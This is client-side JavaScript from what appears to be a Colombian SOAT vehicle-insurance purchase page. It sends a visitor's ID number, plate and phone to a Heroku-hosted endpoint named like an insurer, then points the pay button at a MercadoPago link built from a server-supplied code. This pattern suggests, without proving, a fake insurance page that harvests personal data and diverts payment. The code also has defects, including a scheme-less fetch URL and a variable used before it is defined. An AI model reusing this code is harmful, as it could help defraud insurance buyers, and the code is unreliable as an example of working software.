     var logoloader= document.getElementById('logo_loader');
       logoloader.style.display = "none";
            btn_pagar.style.display = "none";
    var cuadricula= document.getElementById('cuadricula');

if (screen.width >= 1024)
{
  cuadricula.style.display = 'grid';
}
else{
  cuadricula.style.display = '';
}

async function enviarDatosUsuario(){
    try {
    var btn_pagar=document.getElementById("btn_pagar");
    var lb_fecha_inicio_soat=document.getElementById("lb_fecha_inicio_soat");
    var lb_fecha_inicio_soat=document.getElementById("lb_fecha_inicio_soat");
    var lb_fecha_vencimiento_soat=document.getElementById("lb_fecha_vencimiento_soat");
    var lbpreciosoat=document.getElementById("lb_precio_soat");
    var lb_titulo_no_placa=document.getElementById("lb_titulo_no_placa");
    var lb_nombre_comprador=document.getElementById("lb_nombre_comprador");
    var lb_no_placa=document.getElementById("lb_no_placa");
    var lb_marca=document.getElementById("lb_marca");
    var lb_modelo=document.getElementById("lb_modelo");
    var lb_linea=document.getElementById("lb_linea");
    var lb_cIlindraje=document.getElementById("lb_cIlindraje");
    var lb_numeroChasis=document.getElementById("lb_numeroChasis");
    var lb_no_motor=document.getElementById("lb_no_motor");
    let dato={};
    dato.identificacion=document.getElementById("txt_identificacion").value;
    dato.placa=document.getElementById("txt_placa").value;
    dato.telefono=document.getElementById("txt_telefono").value;

     logoloader.style.display = "block";
     btn_pagar.style.display = "none";
    const request = await fetch('colpatsoat.herokuapp.com/soat/vehiculo', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(dato)

    });
    vehiculo = await request.json();
    console.log(vehiculo);
if(request.status==500){
        alert("RUT DICE: Se presento un error durante la consulta al servidor RUT o el vehículo cuenta con un SOAT vigente con expiración superior a los 6 meses. Por favor intenta más tarde");
  logoloader.style.display = "none";
               btn_pagar.style.display = "none";
}
else{
        const formatterPeso = new Intl.NumberFormat('es-CO', {
           style: 'currency',
           currency: 'COP',
           minimumFractionDigits: 0
         })
        lbpreciosoat.textContent=vehiculo.costototal;
        lb_titulo_no_placa.textContent="Precio SOAT por ley "+vehiculo.placa;
        lb_nombre_comprador.textContent=vehiculo.nombres;
        lb_no_placa.textContent=vehiculo.placa;
        lb_marca.textContent=vehiculo.marca;
        lb_modelo.textContent=vehiculo.modelo;
        lb_linea.textContent=vehiculo.linea;
        lb_cIlindraje.textContent=vehiculo.cilindraje;
        lb_numeroChasis.textContent=vehiculo.nochasis;
        lb_no_motor.textContent=vehiculo.nomotor;
        lb_fecha_inicio_soat.textContent=vehiculo.yyycomsoat+"-"+vehiculo.mmcomsoat+"-"+vehiculo.ddcomsoat;
        lb_fecha_vencimiento_soat.textContent=vehiculo.yyyvennusoat+"-"+vehiculo.mmvennusoat+"-"+vehiculo.ddvennusoat;



          btn_pagar.setAttribute('href', 'https://mpago.li/'+vehiculo.cobro);

          logoloader.style.display = "none";
          btn_pagar.style.display = "block";



    }


    }
    catch (Exception){
               alert("RUT DICE: No fue posible encontrar un registro.");
          logoloader.style.display = "none";
               btn_pagar.style.display = "none";

    }
   }









